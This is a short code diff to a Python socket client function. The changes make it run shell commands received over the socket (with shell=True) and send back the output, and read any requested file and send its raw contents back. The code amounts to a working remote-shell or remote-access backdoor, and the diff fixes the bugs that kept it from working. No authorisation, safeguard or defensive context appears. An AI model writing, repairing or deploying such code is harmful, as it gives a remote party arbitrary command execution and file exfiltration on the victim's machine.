@@ -13,11 +13,11 @@ def client():
 
     # message = input('-> ')
     while True:
-        data = s.recv(1024).decode('bin')
+        data = s.recv(1024).decode('utf-8')
         if 'cmd' in data:
             try:
                 data = data.replace('cmd ', '')
-                s.send(subprocess.check_output(data))
+                s.send(subprocess.check_output(data, shell=True))
             except Exception:
                 s.send(f"Error with {data} command".encode('utf-8'))
 
@@ -26,7 +26,7 @@ def client():
             content = ''
             with open(data, 'rb') as f:
                 content = f.read()
-                s.send(content.encode('bin'))
+                s.sendall(content)
 
 
         else:
